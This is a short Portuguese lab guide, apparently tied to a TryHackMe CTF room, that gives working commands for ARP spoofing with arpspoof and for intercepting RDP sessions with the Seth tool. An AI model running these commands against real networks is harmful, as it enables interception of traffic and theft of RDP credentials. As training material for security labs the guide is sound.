# Simulação de Ataque Man-in-the-Middle (MITM)

## 1. Habilitar o Encaminhamento de Pacotes (IP Forwarding)

Este comando ativa o encaminhamento de pacotes IPv4 no sistema, permitindo que a máquina atacante atue como um roteador e retransmita o tráfego entre as duas vítimas.

```
echo 1 > /proc/sys/net/ipv4/ip_forward
````

-----

## 2\. Iniciar o Ataque de ARP Spoofing (PC1 -\> PC2)

Este comando envenena o cache ARP do PC1, fazendo-o acreditar que a máquina atacante é o PC2. O tráfego destinado ao PC2 será, então, redirecionado para o atacante.

```
arpspoof -i eth0 -t [IP_DO_PC1] -r [IP_DO_PC2]
```

-----

## 3\. Iniciar o Ataque de ARP Spoofing (PC2 -\> PC1)

Este comando envenena o cache ARP do PC2, fazendo-o acreditar que a máquina atacante é o PC1. O tráfego destinado ao PC1 será, então, redirecionado para o atacante, completando a inserção no meio da comunicação.

```
arpspoof -i eth0 -t [IP_DO_PC2] -r [IP_DO_PC1]
```

-----

### Ataque Man-in-the-Middle (MITM) em Conexão RDP

Este guia demonstra como realizar um ataque Man-in-the-Middle em uma conexão RDP, utilizando as ferramentas **dsniff** e **Seth**.

#### 1\. Instalação do dsniff

O **dsniff** é uma suíte de ferramentas para interceptação e análise de pacotes de rede. Ele será utilizado para auxiliar no ataque.

```bash
apt install dsniff
```

#### 2\. Download e Configuração do Seth

O **Seth** é uma ferramenta específica para realizar ataques MITM em conexões RDP.

  - **Download e descompactação:**



```bash
wget https://github.com/SySS-Research/Seth/archive/refs/heads/master.zip
unzip master.zip
```

  - **Acesso ao diretório:**



```bash
cd Seth-master
```

#### 3\. Execução do Ataque

Execute o script principal do **Seth** para iniciar o ataque. Substitua os parâmetros pelos IPs correspondentes ao seu ambiente.

```bash
./seth.sh ens33 IP-Atacante IP-Alvo IP-Servidor
```

  - **Parâmetros:**
      - `ens33`: Interface de rede a ser utilizada.
      - `IP-Atacante`: Endereço IP da máquina do atacante.
      - `IP-Alvo`: Endereço IP da máquina da vítima.
      - `IP-Servidor`: Endereço IP do servidor RDP.

-----

**CTF (Capture The Flag)**

Este ataque foi explorado na sala **Layer 2** da plataforma **TryHackMe**:

  - [https://tryhackme.com/room/layer2](https://tryhackme.com/room/layer2)

-----
